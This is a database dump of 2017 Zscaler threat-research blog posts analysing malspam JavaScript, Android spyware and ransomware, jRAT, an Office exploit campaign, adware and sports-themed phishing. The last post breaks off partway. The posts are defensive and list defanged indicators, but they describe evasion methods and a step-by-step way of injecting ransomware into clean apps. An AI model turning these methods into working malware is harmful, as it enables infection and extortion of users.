INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (69, 'JavaScript Malspam Campaigns', 'Rohit Hegde', 'April 25, 2017', 'Introduction:\r\n\r\nThe Zscaler ThreatLabz team has observed multiple active malspam campaigns with links to malicious JavaScript payloads in the wild. These JavaScript files when opened by the end user will trigger download and execution of malware executables belonging to various Dropper and Backdoor Trojan families. We have seen over 10,000 instances of malicious JavaScript payloads from these campaigns in last two weeks. The JavaScript files are highly obfuscated to avoid detection and on first look shared similarity to Angler EK\'s landing page.\r\n\r\nTwo URL formats are commonly being used at this time, one with just alphanumeric characters in path and the other with string ‘.view’ in the path. The examples for these URLs are seen below,\r\n\r\nhttp://yountstreetglass[.]com/TRucDEpdoO4jsaFaF4wCTxl8h/\r\nhttp://unbunt[.]com/view-report-invoice-0000093/w0ru-bb26-w.view/\r\n\r\nThe javascript files have names which try to masquerade as bills and receipts of various services like  DHL, UPS and Vodafone to name a few.\r\n\r\n\r\n\r\nFigure 1: Number of hits for the JavaScript malspam over last 30 days.\r\n\r\nWe analyzed several variations of obfuscated JavaScript payloads and we will look at the details of one such payload in this report.\r\n\r\nInfection Cycle:\r\n\r\nThe attack starts when victims receive malicious spam emails that contain links to what appear to be bills or receipts for different services, such as DHL. Once the user clicks on the link, a malicious JavaScript is downloaded and executed. Internet Explorer displays a warning requesting permission to allow execution of the ActiveX component as shown in the screenshot below:\r\n\r\n\r\n\r\nFigure 2: JavaScript execution on targeted Windows machine\r\n\r\nAllowing execution of this ActiveX component causes the browser to download and execute the malicious payload as shown in the screenshot below:\r\n\r\n\r\n\r\nFigure 3: Malware payload download capture\r\n\r\nJavaScript analysis:\r\n\r\nWhen we opened the JavaScript, we observed that it was heavily obfuscated with random strings and numbers assigned to variables, which makes very little sense.\r\n\r\n\r\n\r\nFigure 4: Obfuscated JavaScript\r\n\r\nThe JsFormatted script shows 4,000+ lines of code, which try to hide the script’s logic.\r\n\r\n\r\n\r\nFigure 5: JsFormatted obfuscated JavaScript\r\n\r\nA quick review of the obfuscated code revealed a line of particular interest, as shown below:\r\n\r\n\r\n\r\nFigure 6: JavaScript code line where the deobfuscation starts.\r\n\r\nStepping into this function call provides us the deobfuscated code. Here, we review the important components of this script:\r\n\r\n\r\n\r\nFigure 7: JavaScript function to download malware from the URL\r\n\r\nThe most important function (below) shows us the hardcoded URLs that will be used to download the malware payloads.\r\n\r\n\r\n\r\nFigure 8:  JavaScript function containing URLs for malware payload.\r\n\r\nThe script will continue trying different URLs from the hardcoded list, until it successfully downloads the malware executable payload from one of them.\r\n\r\nFinally, we looked at the function that executes the payload: the function which executes the payload:\r\n\r\n\r\n\r\nFigure 9: JavaScript function responsible for the malware payload execution.\r\n\r\nThere are also other functions in the script that create temporary file paths and that save the payload to the temporary path. The JavaScript that is downloaded does not have any browser exploit that could cause automatic execution of the ActiveX component; the user has to explicitly allow the execution to get the machine infected. This is a simple JavaScript that was interesting because of the obfuscation involved in its code and its widespread use in malspam traffic.\r\n\r\nWe observed different variants of Trojan.Win32.Kasidet and Trojan.Win32/Emotet.K payloads being downloaded by these JavaScript files. Recently, the spammed URLs started serving zipped version of the JavaScript payload instead of direct JavaScript payload. However, the infection cycle remains identical once the user extracts and runs the JavaScript file.\r\n\r\nConclusion:\r\n\r\nWe should always be cautious when clicking on links or handling e-mail attachments received from an unknown sender. Threat actors keep changing their obfuscation techniques in an attempt to evade detection methods used by security engines. It is increasingly important to have multiple security layers to block these kinds of attacks. Zscaler ThreatLabZ will continue to monitor these malspam campaigns involving malicious scripts to ensure that Zscaler customers are protected.', 'Malware;Spam', 'https://www.zscaler.com/blogs/research/javascript-malspam-campaigns');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (70, 'Android Spyware SMSVova posing as system update on Play Store', 'Shivang Desai', 'April 19, 2017', 'In our ongoing effort to hunt malware, the Zscaler ThreatLabz team came across a highly suspicious app on the U.S. Google Play Store that has been downloaded between one and five million times since 2014. Upon analysis, we found it to be an SMS-based Spyware, which can steal and relay a victim\'s location to an attacker in real time.     The app, which claimed to give users access to the latest Android software updates, was being used to spy on a user’s exact geolocation, which could have been used for any number of malicious reasons.     Google has removed the app from the store since Zscaler reported it to the Google security team.    Basic Details:  Name : System Update  Downloads : 1,000,000 - 5,000,000    The app portrays itself as a “System Update.” After reading the app reviews, it became clear that several users were misled by the app, thinking that it would provide them with latest Android release.            	  		  			  		  		  			Figure 1: System Update on Playstore  		  	           Many users were unhappy with the app and conveyed their concerns.       	  		  			  		  		  			Figure 2: User Reviews on Playstore  		  	           In addition to the reviews, there were other indicators that raised our suspicions. They included:      	The Google Play Store page for this particular app was showing blank screenshots, which is not common  	There was no proper description for the app      Abstract:    Upon analysis, we found this app to be a kind of Spyware. We also blogged about a similar case earlier this year.     There are many spyware variations present on the Google Play Store, such as Cell Tracker, but the legitimate apps are explicit in their intentions, and have specific purposes for tracking a user’s device.    The app in this analysis portrays itself as a system update and does not mention in its description about tracking the victim. As shown in screenshot below, it does not mention that it will send location information to a third party. Also note the missing (or blank) screenshots:           	  		  			  		  		  			Figure 3: Misleading Description  		  	           Techincal Details:    The app portrays itself as a System Update and its description on the Google Play Store states, “This application updates and enables special location features,” but there is no mention of its remote spying capabilities.    As soon as the user tries to start up the app, it abruptly quits with the  message: \"Unfortunately, Update Service has stopped.\" At this point, the app has the ability to hide itself from the main screen.      	  		  			  		  		  			Figure 4: App Icon & Error Message  		  	           Despite the error message, the spyware sets up an Android service and broadcast receiver:      	MyLocationService: Fetches last known location  	IncomingSMS (Receiver): Scans for incoming SMS messages           MyLocationService    Main task of MyLocationService is to fetch the user’s last known location and set it up in Shared Preferences. Shared Preferences is one of the many ways Android stores an application’s data.       	  		  			  		  		  			Figure 5: MyLocation Service  		  	          Incoming SMS    This piece of code is designed to look for incoming SMS messages with a particular syntax, in which the message should be more than 23 characters and should contain “vova-” in the SMS body. It also scans for a message containing “get faq.”     Once the spyware has been installed on the victim’s device, an attacker can send an SMS message “get faq” and this spyware will respond with a set of commands.       	  		  			  		  		  			Figure 6: IncomingSMS fetching SMS  		  	        \'User Manual\' in the above screenshot contains the text as shown below :       	  		  			  		  		  			Figure 7: Commands via SMS  		  	           As seen in instructions above, an attacker could also set a location alert when victim’s battery is running low. The attacker could set a password for this spyware, but it can also be accessed with the default password (default password: Vova).    Once a phone number and password are set, the spyware starts a process designed to send the device location to attacker. This functionality is shown in screenshot below:           	  		  			  		  		  			Figure 8: Sending Location  		  	             The SMS-based behavior and exception generation at the initial stage of startup can be the main reason why none of the antivirus engines on VirusTotal detected this app at the time of analysis.         	  		  			  		  		  			Figure 9: VirusTotal Score  		  	           This app has evaded Google\'s detection for a long time, which is apparent because we can see that the app was last updated in December 2014. But this time lapse does not mean the app or its functionality are dead. We came across a Remote Access Trojan named \"DroidJack,\" which uses the exact code from the app in this analysis for stealing a victim\'s location.     Screenshot below shows the exact code snippet found in DroidJack :       	  		  			  		  		  			Figure 10: Code Comparision.  		  	                                                                                                                                                                                                                                                                                               Conclusion    There are many apps on the Google Play Store that act as a spyware; for example, those that spy on the SMS messages of one’s spouse or fetch the location of children for concerned parents. But those apps explicitly state their purpose, which is not the case with the app we analyzed for this report. It portrayed itself as a system update, misleading  users into thinking they were downloading an Android System Update.    Zscaler ThreatLabZ conducts ongoing research into new and evolving mobile malware to protect Zscaler customers worldwide.', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/android-spyware-smsvova-posing-system-update-play-store');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (71, 'Increase in jRAT Campaigns', 'Sameer Patil', 'April 13, 2017', 'The Zscaler ThreatLabZ team has detected a rise in Java-based remote access Trojan variants — jRATs — which give attackers a backdoor into a victim\'s system and can be capable of remotely taking control of the system once it\'s infected. Malware authors are using numerous tactics to entice unsuspecting users to open infected attachments, which arrive as malicious JAR files. Most recently, we’ve seen filenames such as “IRS Updates.jar” and “Important_PDF.jar,” claiming to contain important tax deadline information from the IRS. We’ve also identified JAR files claiming to be purchase orders or other important documents. When a user opens the file thinking it is an actual communication from the IRS, or said party, the jRAT payload gets installed on the user’s machine.\r\n\r\nWe have seen numerous jRAT instances using the following filenames in the past two weeks:\r\n\r\n\r\n	Important_PDF.jar\r\n	IRS UPDATES.jar\r\n	IRS UPDATE1.jar\r\n	PO#(7 Digits).jar\r\n	Invoice_TS4009653.jar\r\n	DHL_MQ00546_INV_BL_PL_output913C0bb2F_PDF.jar.jar\r\n\r\n\r\n\r\nFigure 1: jRAT instances blocked in last two weeks\r\n\r\nThe jRAT sample that we analyzed for this report was obfuscated with three layers of packing. On execution, the malicious JAR file drops a VBS file in the %APPDATA% folder on the user\'s machine. The dropped VBS files are named “Retrive<Random number>.vbs.” The VBS file then checks for the presence of third-party firewalls and AV software installed on the user’s system.\r\n\r\n\r\nFigure 2: Script to check for firewall presence\r\n\r\n\r\nFigure 3: Script to check for AV presence\r\n\r\nAfter passing these initial checks, it drops a JAR file in the Temp folder with a \".class\" extension and executes it.\r\n\r\nThe JAR file dropped, as seen in the image below, is just a dropper and decrypter for the main jRAT file. It basically contains the jRAT sample in an encrypted form. The encryption of the file is done by an embedded AES key, which is again encrypted using an RSA key. The decrypter for this file has been written by hasherezade of MalwareBytes.\r\n\r\n\r\nFigure 4: Encrypted data and keys in the JAR file\r\n\r\nThe jRAT code is written in a very modular way, segregating different functionalities in different packages. The image below demonstrates the level of obfuscation used by the author to make it difficult to decompile and understand the code.\r\n\r\n\r\nFigure 5: Obfuscated class files in jRAT source code\r\n\r\nIn our sample, there was an encrypted configuration file that contains details for the bot to communicate with the Command & Control (C&C) server.\r\n\r\n\r\nFigure: 6: Decrypted bot configuration file\r\n\r\nThe jRAT payload is capable of receiving commands from a C&C server, downloading and executing arbitrary payloads on the victim\'s machine. It also has the ability to spy on the victim by silently activating the camera and taking pictures.\r\n\r\nFor persistence, the sample creates an autostart registry entry to launch itself upon system reboot.\r\n\r\n\r\nFigure 7: Autostart registry entry\r\n\r\nThe malware connects to a hardcoded URL to download malicious executable files. In case of the sample analyzed in this blog, the following URL was contacted:\r\n\r\n\r\n	workfromhomeplc[.]ru/dmp/PO%233555460.exe\r\n\r\n\r\nAt the time of analysis, the URL was not active, but the site has a known history of hosting the Loki information-stealing bot.\r\n\r\nMalware continues to draw in unsuspecting victims by using current issues and relevant events of the day to capture people\'s attention and interest. With one click, users can become victims, making themselves and their corporate networks vulnerable to attack by malicious payloads. The image below shows the full detonation of this malicious jRAT payload in the Zscaler Cloud Sandbox environment, capturing all its activity.\r\n\r\n\r\nFigure 8: Zscaler Cloud Sandbox report showing all suspicious activities\r\n\r\nResearch by - Sameer Patil and Jithin Nair.', '', 'https://www.zscaler.com/blogs/research/increase-jrat-campaigns');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (72, 'Microsoft Office 0-Day leveraged in spam campaigns', 'Chris Mannon', 'April 13, 2017', 'A new spam campaign has been leveraging exploits for the Microsoft Office vulnerability CVE-2017-0199. Security industry response to the vulnerability was rapid and several in-the-wild exploits have been detailed by various security companies. The timing of this attack was largely preempted by the announcement that Microsoft had plans to patch the vulnerability on their Patch Tuesday (April 11th). Since patching the vulnerability, numerous researchers have provided detailed analysis about the attack campaign. ThreatLabZ has observed and blocked attempts of this exploit being used in the wild.\r\n\r\nThe root of the exploit chain are malicious documents sent via an email spam campaign. These documents attempt to load an external, maliciously crafted RTF document from the Internet, and execute scripts embedded in the document, without user consent, to download and run further malicious payloads. This activity would typically require the user to click through a dialog box to allow the 3rd party content to be loaded, but the malicious document is able to terminate the Microsoft Word process before this warning is displayed and still load the 2nd stage content. In some cases, the user was still presented with the dialog, although the malicious content had already been loaded. Other variants of the attack require user interaction, in the form of double-clicking on text within a malicious document. Regardless of the initial stage, the malicious documents contain a VBScript element, which leverages PowerShell commands to download another payload and a decoy document.\r\n\r\n\r\n\r\nFigure 1: Malicious script embedded within RTF documents\r\n\r\nThe most recent iterations of this campaign have been dropping Dridex malware payloads. Users should be wary of any Office file attachments sent from untrusted sources, especially those that use common scam lures in the e-mail attachment\'s file name.\r\n\r\nIndicators of Compromise (IoC)\r\n\r\n\r\n	\r\n		\r\n			IoC\r\n			Type\r\n			Description\r\n		\r\n		\r\n			[URL]/template.doc\r\n			URL\r\n			Malicious RTF Document\r\n		\r\n		\r\n			u.doc\r\n			File\r\n			Decoy Document\r\n		\r\n		\r\n			u.exe\r\n			File\r\n			Dridex Payload\r\n		\r\n		\r\n			document.doc\r\n			File\r\n			Decoy Document\r\n		\r\n		\r\n			[URL]/.vbs\r\n			URL\r\n			Malicious Visual Basic Script\r\n		\r\n		\r\n			maintenance.vbs\r\n			File\r\n			Malicious Visual Basic Script\r\n		\r\n		\r\n			[URL]/questions.doc\r\n			URL\r\n			Decoy Document\r\n		\r\n		\r\n			eoobvfwiglhiliqougukgm.js\r\n			File\r\n			Malicious JavaScript file\r\n		\r\n		\r\n			[URL]/wood.exe\r\n			URL\r\n			LATENTBOT Payload\r\n		\r\n		\r\n			dcihprianeeyirdeuceulx.exe\r\n			File\r\n			LATENTBOT Payload\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nConclusion\r\n\r\nThe vulnerability has already been patched as of April 11th, 2017. The best defense is to make sure the Microsoft Office is up to date on all security patches. At the heart of the attack, the threat actors are focusing on the social engineering and phishing techniques to trick users into executing the exploit. An easily weaponized vulnerability allows attackers to cast a large net when phishing for new victims. Be conscious of the sender of email attachments, and always verify with the supposed source if you are unsure of the authenticity of an email.\r\n\r\nZscaler ThreatLabZ will continue to monitor and ensure coverage against these exploit payloads.\r\n\r\nWriteup by: Derek Gooley, Chris Mannon', 'Exploit;Microsoft;Spam;Zero Day', 'https://www.zscaler.com/blogs/research/microsoft-office-0-day-leveraged-spam-campaigns');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (73, 'New Android ransomware bypasses all antivirus programs', 'Gaurav Shinde', 'March 28, 2017', 'The Zscaler ThreatLabZ team has found a new variant of Android Ransomware. What makes this variant particularly scary is that it evaded all the antivirus programs tested against it at the time of writing this blog. During our investigation, we uncovered some other interesting findings.    One of the targeted apps is called \'OK\', and it\'s one of the most popular Russian entertainment social network apps. The targeted legitimate app is available on the Google Play Store and has between 50,000,000 - 100,000,000 installs. It is important to note that the OK app available on Google Play Store is NOT malicious. Fortunately, we haven\'t yet spotted the new ransomware strain on the Google Play Store, but as you\'re about to read, the techniques leveraged by this malware improve the chances for the payload to make it on the Google Play Store.    What happens when the malicious package is installed?    Similar to the aggressive adware samples found in Google Play Store that we covered in our blog last week, this malware stays silent for the first four hours after it is installed, allowing the original app to operate without any interference. This technique also allows the ransomware to evade antivirus engines as the app is executed. After four hours, users will see a prompt to add a device administrator as shown below.           	  		  			  		  		  			     Figure 1: Device administrator prompt  		  	           Even if a user presses the Cancel button, the prompt reappears quickly, preventing the user from taking any other action or uninstalling the app. As soon as a user presses the Activate button, the screen will be locked and a full-screen ransom note will be displayed.      	  		  			  		  		  			                                                                                    Figure 2: Ransom note  		  	      Here\'s the English translation of Russian text:      	  		  			  		  		  			                                                                  Figure 3: Ransom note (English translation)  		  	           We analyzed the sample further to understand whether the malware actually sends a user\'s data to a server. We didn\'t find any personal data leak as claimed by the ransomware and were not surprised when we found that the ransomware is NOT capable of unlocking the user\'s phone.    Regardless of whether the user transfers the requested ransom amount to the attacker\'s e-wallet, the ransomware will not stop operating. As soon as phone screen is locked, the malware will notify its Command & Control (C&C) server about the new victim. Interestingly, there is no functionality present in the malware to confirm whether the user has paid the ransom or not and it, therefore, continues to operate.           	  		  			  		  		  			                                                    Figure 4: Notifies C&C server about new victim  		  	      Infection Technique  After analyzing how clean apps become infected with this ransomware, we realized that the malware author did not infect each of these apps manually; instead the author created an automated method for infecting multiple clean apps the same way. Here\'s what the automation looks like:      	  		  			Step 1: Disassemble the clean target app  		  		  			Step 2: Insert required permissions and Activity/BroadcastReceiver entries required for malware into AndroidManifest.xml file  		  		  			Step 3: Copy required images and layout files into the res directory  		  		  			Step 4: Insert strings used for ransom note into res\\values\\strings.xml file  		  		  			Step 5: Copy malicious .smali files into smali directory  		  		  			Step 6: Assemble the apk, re-sign it, now ready to be installed  		  	      How it successfully bypassed antivirus systems    There is no doubt that this malware author employed a combination of techniques to evade antivirus detection. Most antivirus programs analyze samples statically, dynamically, or a combination of both. The injected malicious code in this sample is HIGHLY obfuscated. The C&C server address and phone number are encrypted with Advanced Encryption Standard (AES). Almost all strings, method names, variable names, and class names are disguised in such a way that it\'s extremely difficult to understand the code. Most of these methods are invoked using Java reflection technique, which allows the author to evade static analysis detection.    Most AV programs execute samples for a few seconds or minutes to detect malicious behavior performed by the app. In this case, the malware doesn’t show its presence until four hours have passed. This way, the malware author dodges the dynamic analysis by antivirus systems.    Considering the stealth tactics designed into this sample, it wouldn\'t be difficult to imagine the author successfully uploading this ransomware to the Google Play Store.      	  		  			  		  		  			                                  Figure 5: Obfuscated code example  		  	      Mitigation    If you are infected, boot your device into Safe Mode, which disables all third-party applications (here’s how). Remove the device administrator privilege of the ransomware app. Next, uninstall the app and re-boot your device into normal mode. To minimize the risk of such infections in the future, go to Security settings/Device administration and de-select “Unknown sources.” Above all, it’s always wise to download apps only from trusted sources, such as Google Play Store.    ThreatLabZ researches and analyzes malware variants to raise awareness of new attack vectors, methods, and origins, and to ensure the ongoing protection of Zscaler customers.    Samples           	  		  			SHA1  			package name  		  	  	  		  			fe6f21049a3af68a0e08eebe82e33772b05e5475  			ru.ok.android  		  		  			9251b9e5c6602ba28739ae9c98d4247953ae006c  			com.nitroxenon.terrarium  		  		  			cb908b73cc8db5935074d03cda41ef0fe7f09ccf  			com.cyanogenmod.eleven  		  	           Researched by Gaurav Shinde & Viral Gandhi', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/new-android-ransomware-bypasses-all-antivirus-programs');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (74, 'Nasty adware hiding in apps on Google Play Store', 'Gaurav Shinde', 'March 23, 2017', 'In our ongoing hunt for malicious apps on Google Play Store, we have come across more than a dozen apps that we have confirmed to be aggressive adware strains, with the ability to add themselves as device administrator on a victim\'s mobile device.\r\n\r\nAfter a primary analysis of these apps, we confirmed that they do not have any features that require critical device administration privileges. A common theme among all these apps is that they do not display any suspicious activity for the first six hours after installation. This may be an attempt to evade Googles Bouncer. (Bouncer is Google\'s antivirus system, which executes an app for few minutes and analyzes its behavior before publishing the app on Play Store.)\r\n\r\nFour out of the 12 apps that were reported for this suspicious activity have been downloaded between 10,000 and 50,000 times:\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                                                     Figure 1: Apps with 10,000 to 50,000 downloads\r\n		\r\n	\r\n\r\n\r\nDevice admin privileges\r\n\r\nUpon successful installation, these apps will communicate with a preconfigured Command & Control (C&C) server and act in accordance with C&C directions.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                                                       Figure 2: C&C server communication\r\n		\r\n	\r\n\r\n\r\nIf the response contains the \"show_admin\" parameter to be \"true,\" the following code is executed, which asks the user for admin privileges.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                                                          Figure 3: Code to add device administrator\r\n		\r\n	\r\n\r\n\r\nObservation\r\n\r\nWe continued our analysis on apps that were removed as well as those that were still live on Play Store, sharing the same piece of code, and observed that the majority of the live apps were receiving \"show_admin\" as \"false,\" whereas the removed apps were receiving a value of \"true.\" Although it\'s just a matter of time when the C&C server may respond with \"true,\" causing all these apps to prompt for device admin privileges.\r\n\r\nHere\'s what the device admin prompt looks like:\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Figure 4: Device admin prompt\r\n		\r\n	\r\n\r\n\r\nAs seen in Figure 4, the activation message is displayed to the user in four languages: Vietnamese, English, Japanese, and Chinese. Once the user grants device admin privileges to the app, the app cannot be uninstalled until the user withdraws admin privileges for this app.\r\n\r\nAdvertisement activities\r\n\r\nThe C&C server will send commands instructing the app to perform different advertisement activities on the device. The type of activity we have seen from these apps during our analysis include:\r\n\r\n\r\n	Full screen ads\r\n	Open a link in mobile browser\r\n	Launch a YouTube video\r\n	Launch an already installed app on the phone\r\n	Create a new shortcut on the home screen for a given URL\r\n\r\n\r\nCode piracy\r\n\r\nMost of the apps in this report are examples of source code piracy. The app with the package name com.ndk.taskkiller, for example, is a pirated version of com.batterysaver.taskkiller. (Note that com.batterysaver.taskkiller was not found to be malicious.)\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			\r\n			                                                                                          Figure 5: Original app\r\n			\r\n		\r\n	\r\n\r\n\r\nThe package called com.ndk.taskkiller shown below not only uses the same code as the original app, from which it was pirated, but also has the same appearance.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                                                                          Figure 6: Pirated app\r\n		\r\n	\r\n\r\n\r\nInjected code\r\n\r\nThe pirated app has injected a new package named \"logs\" into the copied source code.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			          Figure 7: Difference in packages between original and pirated app\r\n		\r\n	\r\n\r\n\r\nAnalysis of injected code\r\n\r\nThe location of injected code is interesting. The com.google.android.gms package is Android\'s genuine package for Google Mobile Services (GMS). A complete list of Google GMS packages can be found here. In this case, a package named \"logs\" is injected inside the GMS packages to evade detection.\r\n\r\nAll the strings in the code were obfuscated, which makes them difficult to understand. The encryption technique leveraged here is trivial but served its purpose. After decrypting all the strings, the de-obfuscated code revealed the secrets hidden within, as shown in Figure 9.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			\r\n			                                                                                           Figure 8: Obfuscated code\r\n			\r\n		\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			\r\n			                                                                    Figure 9: De-obfuscated code\r\n			\r\n		\r\n	\r\n\r\n\r\nIt is clear from the de-obfuscated code that the app is trying to load another dex (secondlib.dex) file dynamically. But where does this secondary dex come from? As we analyzed the app\'s network traffic, we confirmed that this dex file was being downloaded at runtime.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			\r\n			                                                                      Figure 10: Downloading secondlib.dex\r\n			\r\n		\r\n	\r\n\r\n\r\nThe secondlib.dex file has code that, when executed, plays a particular YouTube video. This function would generate revenue for the video uploader by increasing its number of views. It\'s notable that this dex file is not embedded in the original app, but is downloaded at runtime. This means that the app developer can change the code of secondlib.dex at any time and it will be executed on the user\'s device without requiring the user to update the app.\r\n\r\nOne of this app\'s more interesting features is its ability to hide and unhide its icon based on the C&C server instructions. To avoid user suspicion, the app does not hide its icon as soon as the user opens the app for the first time — a common behavior in most malware families. The app\'s icon is only hidden if the app is not used for five days. In most cases, if an average user does not open an app for five days, after which the app icon is concealed, the user will probably have no idea where those annoying ads are coming from and is unlikely to suspect the now-hidden app.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			\r\n			                                                                Figure 11: Code to hide app icon\r\n			\r\n		\r\n	\r\n\r\n\r\nSpreading\r\n\r\nAlthough we haven\'t observed any phishing or spam attempts to deliver these apps, we found an interesting way by which one of the apps is advertising itself outside the Google Play Store through a YouTube gameplay video for the \"Eighth Note Jump\" game. The uploader has added a download link in the description of the video that points to the app \"Eighth Note Jump – Talk 2 Me\" on Play Store, which is one of the 12 malicious apps that we found.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                                                   Figure 12: YouTube video promoting an app with the adware\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nFull list of malicious package names found on Google Play Store\r\n\r\n\r\n	\r\n		\r\n			com.barcodescannertvc.vnm\r\n			com.fastchargertie.vnm\r\n			com.g8note.screamjump\r\n			com.lichviet.lichvannien.lichamduong\r\n			com.photoeditor.cutphoto.pastephotos\r\n			com.qrbarcodescanneranh.vn\r\n			com.qrbarcodescanneroeh.vnm\r\n			com.qrbarcodescannertva.vnm\r\n			com.qrcodereader.htr.hcm\r\n			com.smartcompassproto.vnm\r\n			com.smartcompasstvc.vnm\r\n			game.danhbaidoithe.winday\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nConclusion:\r\n\r\nDespite the precautionary measures taken by Google, malware developers are finding new ways to upload their apps on Google Play Store. More and more malware strains – and now adware – are becoming sophisticated and more adept at staying under the radar.\r\n\r\nZscaler ThreatlabZ reported these apps to Google\'s Android security team on Mar 20, 2017, and the apps have been taken down from Play Store as of Mar 22, 2017.\r\n\r\nThreatLabZ continuously monitors and blocks threats, such as those that use hidden code to communicate to C&C servers, to protect Zscaler customers.', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/nasty-adware-hiding-apps-google-play-store');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (75, 'March Madness Fake Streams and Phishing Attempts', 'Rohit Hegde', 'March 21, 2017', 'March Madness is in full swing and the Sweet 16 games are upon us! While enthusiasts everywhere prepare to stream their favorite teams\' games, the increased interest in the tournament has also attracted the attention of threat actors who\'ve produced a variety of ways to trick fans into downloading malicious code. Zscaler researchers have observed multiple threats, and we hope the information outlined here can help some fans avoid becoming victims.     Through the first round of the tournament, Zscaler saw increased activity from users streaming games and checking their brackets for updates as shown in Figure 1. We saw the traffic in this category increase by 100% during the game week. We also observed an increase in malicious activity related to the sports category. As shown in Figure 2, there was a clear upward spike in malicious activity over the last 15 days, such as phishing pages, adware downloads, improper handling of user data, and attempts at domain squatting.        Figure 1. Total traffic in sports category, 13 March 2017 to 18 March 2017         Figure 2. Malicious activity blocked for  web activity in the sports category , 4 March 2017 to 21 March 2017    We checked our data to monitor for attacks that might affect users through March Madness. The best advice we can offer is to be sure to use NCAA-sanctioned bracket applications through your web browser. There are many third-party sites out there that attempt to probe the user to create login credentials. In the example below, we observed that one such application collects a username and password and then transmits it in the clear. This plain text credential transfer makes the connection vulnerable to sniffing attacks. Since users commonly set the same login credentials for multiple websites, the attackers might gain access to users email accounts, bank accounts, tax preparation accounts etc.    website:  bracketintel[.]net             Figure 3. Generic bracket filling page.    When we tried to register for an account we saw the Register page on bracketintel[.]net as shown below.         Figure 4. Registration page on bracket filling website.    Packet capture shows the registration process taking place in clear text,        Figure 5. Plain text credential seen on packet capture.    If fans are looking to stream the NCAA tournament for free, they can easily find the games at www.ncaa.com. However, a simple Google search of the phrase “NCAA free streaming” yields some dubious results including this one from ifirstrowus[.]eu which comes up as the fifth hit on the search page. Basketball enthusiasts that click through this site to watch the games will be sorely disappointed. Instead of watching their alma mater, they will be redirected to a site that installs a browser hijacker, which prompts users to install toolbars and change the homepage to search.searchliveson[.]com to continue watching the game.        Figure 6. Google search results for \"NCAA free streaming\"    Clicking the streaming link takes users to websites using social engineering techniques to prompt them to click on advertisements on the page which say content cannot be played.        Figure 6. Free streaming website.    Clicking on the advertisements serves up a webpage prompting users to download adware.        Figure 7. Redirected page prompting for plugin download.    The homepage is changed and a plugin is added to the browser        Figure 8. Browser hijacker installed on the user machine    Based on the geographic location of the user, the site also serves a series of suspicious pages that have the same theme but different names as shown below,                Figure 9. Suspicious websites with same theme but different names.    The browser hijacker itself will modify the user’s homepage and redirect browser searches.    Another example of an adware download instance can be seen below. The streaming website provides a free ESPN streaming service.        Figure 10. Website providing free streaming acccess to ESPN    Clicking on this stream sends users to the site below which has advertisements and fake \"close\" buttons.        Figure 11. Flash player with ads having fake close buttons.    Attempting to close the advertisements by clicking the fake close buttons prompts a user to download the Potentially Unwanted Program(PUP) known as ReimageRepair.        Figure 12. Download of PUP     We also observed domain squatting attempts for known websites in the sports category, a few of those domains include:    www[.]cbssports[.]comespn[.]com    www[.]cbssport[.]com    www[.] cespn[.]com    www[.]1010espn[.]com    www[.]foxsportla[.]com    Domain squatted addresses can be used to host phishing webpages which look like genuine websites but steal user credentials and other information. They can also be used as mail server domains to send out spam emails.    Conclusion    All these examples should highlight the diversity of threats that  attempt to exploit the popularity of March Madness. We encourage readers to exercise caution when doing searches or clicking on links related to March Madness. Zscaler ThreatLabZ continuously monitors online activity worldwide to ensure that Zscaler customers are protected from threats, even if they become tricked into clicking a nefarious link.    Researched by Chris Mannon and Rohit Hegde', 'Phishing', 'https://www.zscaler.com/blogs/research/march-madness-fake-streams-and-phishing-attempts');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (76, 'Top Exploit Kit Activity Roundup - Winter 2017', 'Derek Gooley', 'March 07, 2017', 'Overview\r\n\r\nThis is the fourth in a series of posts in which we\'re examining recent activity of the current top exploit kits. An exploit kit (EK) is a rapidly deployable software package designed to leverage vulnerabilities in web browsers to deliver a malicious payload to a victim’s computer. Authors of EKs offer their services for a fee, distributing malware for other malicious actors.\r\n\r\nNotable changes have been observed this quarter in several EKs, including a limited return of Neutrino, a new KaiXin campaign, and changes to Sundown URL schemes.\r\n\r\nYou can find our previous roundup here.\r\n\r\nRIG Exploit Kit\r\n\r\nThroughout late 2016 and early 2017, RIG has remained the most active exploit kit, although overall activity has decreased in comparison to our previous review.\r\n\r\n\r\n\r\nFigure 1: RIG hits, December 2016 – February 2017\r\n\r\nLast fall, RIG took over as the primary distributor of CryptXXX ransomware, and became the EK of choice for the EITest and pseudoDarkleach campaigns, after the Neutrino EK was presumably shut down in September 2016. RIG continues to drop various ransomware payloads: CryptoShield, Cerber, Locky, and others.\r\n\r\n\r\n\r\nFigure 2: RIG heat map\r\n\r\nWe have seen new 